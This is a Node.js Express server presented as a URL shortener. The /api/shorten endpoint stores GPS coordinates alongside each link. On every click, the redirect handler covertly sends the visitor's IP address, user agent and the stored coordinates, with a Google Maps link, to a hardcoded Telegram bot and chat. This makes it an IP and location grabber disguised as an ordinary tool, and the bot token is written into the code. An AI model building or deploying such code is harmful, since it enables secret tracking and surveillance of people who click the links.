const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    let msg = `
🔗 رابط جديد!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
`;

    if (gps && gps.lat && gps.lng) {
      const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
      msg += `
━━ موقع GPS ━━
📍 دائرة العرض: ${gps.lat}
📍 خط الطول: ${gps.lng}
📏 الدقة: ±${accuracy} متر
🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
📡 النوع: GPS (دقيق جداً)
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم تفعيل GPS
`;
    }

    msg += `
━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
    
    console.log('[Telegram] Message sent with GPS:', gps ? 'YES' : 'NO');
  } catch (err) {
    console.error('[Telegram] Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url, gps } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { 
    original: url, 
    created: new Date(), 
    clicks: 0,
    gps: gps || null
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const gps = linkStorage[code].gps;
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;
  
  console.log(`[Route] Code: ${code}, GPS: ${gps ? 'YES' : 'NO'}`);
  
  sendToTelegram(ip, code, originalUrl, userAgent, gps);
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));